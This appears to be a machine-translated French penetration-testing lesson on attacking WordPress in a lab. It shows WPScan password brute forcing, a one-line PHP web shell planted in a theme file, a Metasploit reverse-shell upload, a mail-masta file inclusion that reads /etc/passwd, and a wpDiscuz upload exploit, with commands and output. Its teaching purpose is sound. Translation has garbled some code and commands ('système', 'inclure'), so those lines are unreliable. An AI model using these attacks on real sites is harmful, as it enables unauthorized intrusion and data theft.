Attaquer WordPress
===================

* * * * *

Nous avons confirmé que le site Web de l'entreprise fonctionne sur WordPress et avons énuméré la version et les plugins installés. Cherchons maintenant des chemins d'attaque et essayons d'accéder au réseau interne.

Il existe plusieurs façons d'abuser de la `fonctionnalité intégrée` pour attaquer une installation WordPress. Nous aborderons le brute forcing de connexion sur la page `wp-login.php` et l'exécution de code à distance via l'éditeur de thème. Ces deux tactiques s'appuient l'une sur l'autre car nous devons d'abord obtenir des informations d'identification valides pour qu'un utilisateur de niveau administrateur se connecte au back-end WordPress et modifie un thème.

* * * * *

Se connecter
----------------

WPScan peut être utilisé pour forcer brutalement les noms d'utilisateur et les mots de passe. Le rapport d'analyse de la section précédente a renvoyé deux utilisateurs enregistrés sur le site Web (admin et john). L'outil utilise deux types d'attaques par force brute de connexion, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) et wp-login. La méthode `wp-login` tentera de forcer brutalement la page de connexion WordPress standard, tandis que la méthode `xmlrpc` utilise l'API WordPress pour effectuer des tentatives de connexion via `/xmlrpc.php`. La méthode `xmlrpc` est préférée car elle est plus rapide.

```
dsgsec@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL : http://blog.inlanefreight.local/ [10.129.42.195]
[+] Début : mer 25 août 11:56:23 2021

<SNIP>

[+] Effectuer une attaque par mot de passe sur Xmlrpc contre 1 utilisateur/s
[SUCCÈS] - Jean / firebird1
Essayer john / bettyboop Heure : 00:00:13 < > (660 / 14345052) 0,00% ETA : ??:??:??

[!] Combinaisons valides trouvées :
  | Nom d'utilisateur : john, mot de passe : firebird1

[!] Aucun jeton d'API WPVulnDB n'a été fourni, par conséquent, les données de vulnérabilité n'ont pas été générées.
[!] Vous pouvez obtenir un jeton API gratuit avec 50 requêtes quotidiennes en vous inscrivant sur https://wpvulndb.com/users/sign_up

[+] Terminé : mer 25 août 11:56:46 2021
[+] Demandes effectuées : 799
[+] Requêtes mises en cache : 39
[+] Données envoyées : 373,152 Ko
[+] Données reçues : 448 799 Ko
[+] Mémoire utilisée : 221 Mo

[+] Temps écoulé : 00:00:23

```

L'indicateur `--password-attack` est utilisé pour indiquer le type d'attaque. L'argument `-U` accepte une liste d'utilisateurs ou un fichier contenant des noms d'utilisateurs. Cela s'applique également à l'option de mots de passe `-P`. Le drapeau `-t` est le nombre de threads que nous pouvons ajuster vers le haut ou vers le bas en fonction. WPScan a pu trouver des informations d'identification valides pour un utilisateur, `john:firebird1`.

* * * * *

Exécution de code
--------------

Avec un accès administratif à WordPress, nous pouvons modifier le code source PHP pour exécuter des commandes système. Connectez-vous à WordPress avec les informations d'identification de l'utilisateur `john` , ce qui nous redirigera vers le panneau d'administration. Cliquez sur `Apparence` sur le panneau latéral et sélectionnez Éditeur de thème. Cette page nous permettra d'éditer directement le code source PHP. Un thème inactif peut être sélectionné pour éviter de corrompre le thème principal. Nous savons déjà que le thème actif est Transport Gravity. Un thème alternatif tel que Twenty Nineteen peut être choisi à la place.

Cliquez sur `Sélectionner` après avoir sélectionné le thème, et nous pouvons modifier une page inhabituelle telle que `404.php` pour ajouter un shell Web.

Code : php

```
système($_GET[0]);

```

Le code ci-dessus devrait nous permettre d'exécuter des commandes via le paramètre GET `0`. Nous ajoutons cette seule ligne au fichier juste en dessous des commentaires pour éviter une trop grande modification du contenu.

![](https://academy.hackthebox.com/storage/modules/113/theme_editor.png)

Cliquez sur `Mettre à jour le fichier` en bas pour enregistrer. Nous savons que les thèmes WordPress se trouvent dans `/wp-content/themes/<theme name>`. Nous pouvons interagir avec le shell Web via le navigateur ou en utilisant `cURL`. Comme toujours, nous pouvons ensuite utiliser cet accès pour obtenir un shell inverse interactif et commencer à explorer la cible.

```
dsgsec@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

Le module [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) de Metasploit peut être utilisé pour télécharger un shell et l'exécuter automatiquement.

Le module télécharge un plugin malveillant et l'utilise ensuite pour exécuter un shell PHP Meterpreter. Nous devons d'abord définir les options nécessaires.

```
msf6 > utilisez exploit/unix/webapp/wp_admin_shell_upload

[*] Aucune charge utile configurée, par défaut php/meterpreter/reverse_tcp

exploit msf6 (unix/webapp/wp_admin_shell_upload) > définir les rhosts blog.inlanefreight.local
exploit msf6 (unix/webapp/wp_admin_shell_upload)> définir le nom d'utilisateur john
exploit msf6 (unix/webapp/wp_admin_shell_upload) > définir le mot de passe firebird1
exploit msf6 (unix/webapp/wp_admin_shell_upload) > définir lhost 10.10.14.15
exploit msf6 (unix/webapp/wp_admin_shell_upload) > définir rhost 10.129.42.195
exploit msf6 (unix/webapp/wp_admin_shell_upload) > définir VHOST blog.inlanefreight.local

```

Nous pouvons ensuite émettre la commande `show options` pour nous assurer que tout est correctement configuré. Dans cet exemple de laboratoire, nous devons spécifier à la fois le vhost et l'adresse IP, ouL'exploit échouera avec l'erreur `Exploit abandonné en raison d'un échec : introuvable : la cible ne semble pas utiliser WordPress`.

```
exploit msf6 (unix/webapp/wp_admin_shell_upload) > afficher les options

Options du module (exploit/unix/webapp/wp_admin_shell_upload) :

    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    PASSWORD firebird1 oui Le mot de passe WordPress avec lequel s'authentifier
    Proxies non Une chaîne de proxy au format type:host:port[,type:host:port][...]
    RHOSTS 10.129.42.195 oui Le ou les hôtes cibles, l'identifiant CIDR de la plage ou le fichier d'hôtes avec la syntaxe 'file:<path>'
    RPORT 80 oui Le port cible (TCP)
    SSL false non Négocier SSL/TLS pour les connexions sortantes
    TARGETURI / oui Le chemin de base vers l'application wordpress
    USERNAME john oui Le nom d'utilisateur WordPress avec lequel s'authentifier
    VHOST blog.inlanefreight.local non Hôte virtuel du serveur HTTP

Options de charge utile (php/meterpreter/reverse_tcp) :

    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    LHOST 10.10.14.15 oui L'adresse d'écoute (une interface peut être spécifiée)
    LPORT 4444 oui Le port d'écoute

Cible d'exploitation :

    Nom d'identification
    -- ----
    0 Wordpress

```

Une fois que nous sommes satisfaits de la configuration, nous pouvons taper `exploit` et obtenir un reverse shell. À partir de là, nous pourrions commencer à énumérer l'hôte pour les données sensibles ou les chemins pour l'escalade verticale/horizontale des privilèges et le mouvement latéral.

```
exploit msf6 (unix/webapp/wp_admin_shell_upload) > exploit

[*] Démarrage du gestionnaire TCP inversé le 10.10.14.15:4444
[*] Authentification avec WordPress en utilisant doug:jessica1...
[+] Authentifié avec WordPress
[*] Préparation de la charge utile...
[*] Téléchargement de la charge utile...
[*] Exécution de la charge utile sur /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Étape d'envoi (39264 octets) vers 10.129.42.195
[*] Session Meterpreter 1 ouverte (10.10.14.15:4444 -> 10.129.42.195:42816) au 2021-09-20 19:43:46 -0400
i[+] Supprimé wCoUuUPfIO.php
[+] Supprimé CczIptSXlr.php
[+] Supprimé ../CczIptSXlr

meterpreter > getuid

Nom d'utilisateur du serveur : www-data (33)

```

Dans l'exemple ci-dessus, le module Metasploit a téléchargé le fichier `wCoUuUPfIO.php` dans le répertoire `/wp-content/plugins` . De nombreux modules Metasploit (et d'autres outils) tentent de se nettoyer après eux-mêmes, mais certains échouent. Lors d'une évaluation, nous voudrions faire tout notre possible pour nettoyer cet artefact du système client et, que nous ayons pu le supprimer ou non, nous devrions répertorier cet artefact dans les annexes de notre rapport. À tout le moins, notre rapport devrait avoir une section en annexe qui répertorie les informations suivantes --- plus à ce sujet dans un module ultérieur.

- Systèmes exploités (nom d'hôte/IP et méthode d'exploitation)
- Utilisateurs compromis (nom du compte, méthode de compromission, type de compte (local ou domaine))
- Artefacts créés sur les systèmes
- Modifications (telles que l'ajout d'un utilisateur administrateur local ou la modification de l'appartenance à un groupe)

* * * * *

Tirer parti des vulnérabilités connues
--------------------------------

Au fil des ans, le cœur de WordPress a souffert de sa juste part de vulnérabilités, mais la grande majorité d'entre elles se trouvent dans les plugins. Selon la page WordPress Vulnerability Statistics hébergée [ici](https://wpscan.com/statistics), au moment de la rédaction, il y avait 23 595 vulnérabilités dans la base de données WPScan. Ces vulnérabilités peuvent être décomposées comme suit :

- 4 % de cœur WordPress
- 89% de plugins
- 7% thèmes

Le nombre de vulnérabilités liées à WordPress a augmenté régulièrement depuis 2014, probablement en raison de la quantité de thèmes et de plugins gratuits (et payants) disponibles, avec de plus en plus d'ajouts chaque semaine. Pour cette raison, nous devons être extrêmement minutieux lors de l'énumération d'un site WordPress car nous pouvons trouver des plugins avec des vulnérabilités récemment découvertes ou même d'anciens plugins inutilisés/oubliés qui ne servent plus à rien sur le site mais qui sont toujours accessibles.

Remarque : Nous pouvons utiliser l'outil [waybackurls](https://github.com/tomnomnom/waybackurls) pour rechercher les anciennes versions d'un site cible à l'aide de la Wayback Machine. Parfois, nous pouvons trouver une version précédente d'un site WordPress utilisant un plugin qui a une vulnérabilité connue. Si le plugin n'est plus utilisé mais que les développeurs ne l'ont pas supprimé correctement, nous pouvons toujours accéder au répertoire dans lequel il est stocké et exploiter une faille.

#### Plugins Vulnérables - mail-masta

Regardons quelques exemples. Le plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) n'est plus pris en charge, mais a enregistré plus de 2 300 [téléchargements](https://wordpress.org/plugins/mail-masta/ avancé/) au fil des ans. Il n'est pas hors de question que nous puissions rencontrer ce plugin lors d'une évaluation, probablement installé une fois et oublié. SiDepuis 2016, il a subi une [injection SQL non authentifiée](https://www.exploit-db.com/exploits/41438) et une [Inclusion de fichiers locaux](https://www.exploit-db.com/exploits/ 50226).

Examinons le code vulnérable du plugin mail-masta.

Code : php

```
<?php

inclure($_GET['pl']);
global $wpdb ;

$camp_id=$_POST['camp_id'] ;
$masta_reports = $wpdb->prefix . "masta_reports" ;
$count=$wpdb->get_results("SELECT count(*) co from $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co ;

?>

```

Comme nous pouvons le voir, le paramètre `pl` nous permet d'inclure un fichier sans aucun type de validation ou de nettoyage des entrées. En utilisant cela, nous pouvons inclure des fichiers arbitraires sur le serveur Web. Exploitons cela pour récupérer le contenu du fichier `/etc/passwd` à l'aide de `cURL`.

Plugins vulnérables - mail-masta

```
dsgsec@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

racine:x:0:0:racine:/racine:/bin/bash
démon:x:1:1:démon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
jeux:x:5:60:jeux:/usr/jeux:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sauvegarde:x:34:34:sauvegarde:/var/sauvegardes:/usr/sbin/nologin
list:x:38:38:Gestionnaire de liste de diffusion :/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
personne:x:65534:65534:personne:/inexistant:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:synchronisation de l'heure systemd,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/inexistant:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/inexistant:/usr/sbin/nologin
tss:x:106:111:pile logicielle TPM,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/inexistant:/usr/sbin/nologin
paysage:x:109:115::/var/lib/paysage:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:démon usbmux,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false

```

#### Plugins Vulnérables - wpDiscuz

[wpDiscuz](https://wpdiscuz.com/) est un plugin WordPress pour améliorer les commentaires sur les publications de page. Au moment de la rédaction de cet article, le plugin comptait plus [1,6 million de téléchargements](https://wordpress.org/plugins/wpdiscuz/advanced/) et plus de 90 000 installations actives, ce qui en fait un plugin extrêmement populaire que nous avons de très bonnes chances de rencontrer lors d'une évaluation. Sur la base du numéro de version (7.0.4), cet [exploit](https://www.exploit-db.com/exploits/49967) a de bonnes chances d'obtenir l'exécution de la commande. Le nœud de la vulnérabilité est un contournement de téléchargement de fichiers. wpDiscuz est destiné uniquement à autoriser les pièces jointes d'images. Les fonctions de type mime de fichier pourraient être contournées, permettant à un attaquant non authentifié de télécharger un fichier PHP malveillant et d'obtenir l'exécution de code à distance. Vous trouverez plus d'informations sur le contournement des fonctions de détection de type mime [ici](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/) .

Le script d'exploit prend deux paramètres : `-u` l'URL et `-p` le chemin d'accès à une publication valide.

Plugins vulnérables - wpDiscuz

```
dsgsec@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

-------------------------------------------------- --------------
[-] Plugin Wordpress wpDiscuz 7.0.4 - Exécution de code à distance
[-] Vulnérabilité de contournement de téléchargement de fichiers - Téléchargement PHP Webshell
[-] CVE : CVE-2020-24186
[-] https://github.com/hevox
-------------------------------------------------- --------------

[+] Longueur de la réponse :[102476] | code :[200]
[!] Valeur wmuSecurity obtenue : 5c9398fcdb
[!] Valeur wmuSecurity obtenue : 1

[+] Génération d'un nom aléatoire pour Webshell...
[!] Nom du webshell généré : uthsdkbywoxeebg

[!] Essayer de télécharger Webshell..
[+] Téléchargement réussi... Chemin Webshell : url&quot; :&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot;

> identifiant

[x] Impossible d'exécuter le code PHP...

```

L'exploit tel qu'il est écrit peut échouer, mais nous pouvons utiliser `cURL` pour exécuter des commandes à l'aide du shell Web téléchargé. Nous avons juste besoin d'ajouter `?cmd=` après l'extension `.php` pour exécuter les commandes que nous pouvons voir dans le script d'exploitation.

VulPlugins compatibles - wpDiscuz

```
dsgsec@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

Dans cet exemple, nous voudrions nous assurer de nettoyer le fichier `uthsdkbywoxeebg-1629904090.8191.php` et de le répertorier à nouveau en tant qu'artefact de test dans les annexes de notre rapport.

* * * * *

Passer à autre chose
---------

Comme nous l'avons vu dans les deux dernières sections, WordPress présente une vaste surface d'attaque. Au cours de nos carrières en tant que testeurs d'intrusion, nous rencontrerons presque certainement WordPress à plusieurs reprises. Nous devons avoir les compétences nécessaires pour effectuer rapidement une empreinte d'une installation WordPress et effectuer une énumération manuelle et basée sur des outils pour découvrir les erreurs de configuration et les vulnérabilités à haut risque. Si ces sections sur WordPress vous intéressent, consultez le [module Attaquer WordPress](https://academy.hackthebox.com/course/preview/hacking-wordpress) pour plus d'entraînement.